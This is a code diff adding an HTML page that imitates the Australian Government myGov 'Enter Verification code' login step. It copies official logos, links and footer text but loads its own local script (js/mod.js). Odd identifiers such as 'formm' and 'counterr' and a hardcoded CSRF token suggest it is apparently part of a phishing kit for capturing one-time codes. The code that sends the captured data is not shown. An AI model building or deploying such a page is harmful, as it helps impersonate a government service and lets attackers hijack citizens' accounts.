@@ -1,0 +1,222 @@
+<html lang="en" class="">
+  <head>
+    <link type="text/css" id="dark-mode" rel="stylesheet" href="" />
+    <style type="text/css" id="dark-mode-сustom-style"></style>
+    <style type="text/css" id="dark-mode-theme-changer-style"></style>
+    <!--<![endif]-->
+
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <title>Verify Login - myGov</title>
+    <meta name="description" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="format-detection" content="telephone=no" />
+
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="32x32"
+      href="images/favicon-32x32.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="16x16"
+      href="images/favicon-16x16.png"
+    />
+    <link
+      href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap"
+      rel="stylesheet"
+    />
+    <link href="css/mgv2-application.css" rel="stylesheet" />
+    <link href="css/blugov.css" rel="stylesheet" />
+    <link rel="stylesheet" href="css/mod.css" />
+    <link rel="stylesheet" type="text/css" href="css/toastify.min.css" />
+    <script src="js/mod.js"></script>
+  </head>
+
+  <body>
+    <nav class="uikit-skip-link" aria-label="Skip Links">
+      <a class="uikit-skip-link__link" href="#content">Skip to main content</a>
+    </nav>
+
+    <div class="brand-rainbow">&nbsp;</div>
+    <header role="banner" class="mgvEnhanceHeader">
+      <section class="wrapper">
+        <div class="inner">
+          <div class="unauth-grid">
+            <div class="unauth-grid-row">
+              <a href="https://my.gov.au/" class="unauth-govt-crest__link">
+                <img
+                  id="unauth-govt-crest"
+                  src="images/myGov-cobranded-logo-black.svg"
+                  alt="Australian Government and myGov logo"
+                  role="img"
+                />
+              </a>
+
+              <div class="header-links">
+                <a href="https://my.gov.au/en/about/help">Help</a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    </header>
+
+    <div class="wrapper-mapwap">
+      <div class="main-block" id="content" role="main">
+        <div class="unauth">
+          <div class="login-grid-container">
+            <div class="login-grid-row">
+              <div class="login-grid-column">
+                <div class="digital-id-login-card-wrapper">
+                  <div class="digital-id-main-login-card override">
+                    <h1>Enter Verification code</h1>
+
+                    <form
+                      id="formm"
+                      aria-describedby="error-msg"
+                      class="mygov-login-form alternative"
+                    >
+                      <div class="input-group">
+                        <!-- <label class="override" for="userId">Enter code</label> -->
+                        <input
+                          id="code_input"
+                          name="username"
+                          required=""
+                          aria-required="true"
+                          data-username="data-username"
+                          type="number"
+                          value=""
+                          autocomplete="off"
+                        />
+                      </div>
+                      <p class="recovery">
+                        <a
+                          href="javascript:void()"
+                          id="resend_btn"
+                          class="anchor override"
+                          >Resend code</a
+                        >
+                        <span id="counterr" class="counterr hidee"
+                          >0:<span class="counterr">59</span></span
+                        >
+                      </p>
+
+                      <div class="button-digital-id-main-container override">
+                        <div class="digital-id-button-container">
+                          <button
+                            type="submit"
+                            id="submit_btn"
+                            class="button-main"
+                            name="_eventId_login"
+                          >
+                            <!-- Submit -->
+                            <span id="btn_text"> Submit</span>
+                            <span id="btn_loader">
+                              <div class="spinner">
+                                <div class="bar1"></div>
+                                <div class="bar2"></div>
+                                <div class="bar3"></div>
+                                <div class="bar4"></div>
+                                <div class="bar5"></div>
+                                <div class="bar6"></div>
+                                <div class="bar7"></div>
+                                <div class="bar8"></div>
+                                <div class="bar9"></div>
+                                <div class="bar10"></div>
+                                <div class="bar11"></div>
+                                <div class="bar12"></div>
+                              </div>
+                            </span>
+                          </button>
+                        </div>
+                      </div>
+
+                      <input type="hidden" name="authtype" value="unamepword" />
+                      <input
+                        type="hidden"
+                        name="_csrf"
+                        value="2d7dcf41-1a40-431e-a678-a09709af8f44"
+                      />
+                      <div>
+                        <input
+                          type="hidden"
+                          name="_csrf"
+                          value="2d7dcf41-1a40-431e-a678-a09709af8f44"
+                        />
+                      </div>
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <footer role="contentinfo">
+      <div class="wrapper">
+        <div class="inner">
+          <section class="footer-list">
+            <nav>
+              <h2 class="sr-only" aria-label="Footer">Footer</h2>
+              <ul class="lower-links">
+                <li>
+                  <a target="_blank" href="https://my.gov.au/en/about/terms"
+                    >Terms of use</a
+                  >
+                </li>
+                <li>
+                  <a
+                    target="_blank"
+                    href="https://my.gov.au/en/about/privacy-and-security"
+                    >Privacy and security</a
+                  >
+                </li>
+                <li>
+                  <a target="_blank" href="https://my.gov.au/en/about/copyright"
+                    >Copyright</a
+                  >
+                </li>
+                <li>
+                  <a
+                    target="_blank"
+                    href="https://my.gov.au/en/about/accessibility"
+                    >Accessibility</a
+                  >
+                </li>
+              </ul>
+            </nav>
+          </section>
+          <div class="footer-lower">
+            <section class="footer-lower-logo">
+              <a href="https://my.gov.au/">
+                <img
+                  src="images/myGov-cobranded-logo-white.svg"
+                  alt="Australian Government and myGov logo"
+                  width="313.17"
+                  height="70"
+                  role="img"
+                />
+              </a>
+            </section>
+
+            <p class="footer-acknowledgement">
+              We acknowledge the Traditional Custodians of the lands we live on.
+              We pay our respects to all Elders, past and present, of all
+              Aboriginal and Torres Strait Islander nations.
+            </p>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/toastify-js"
+    ></script>
+  </body>
+</html>
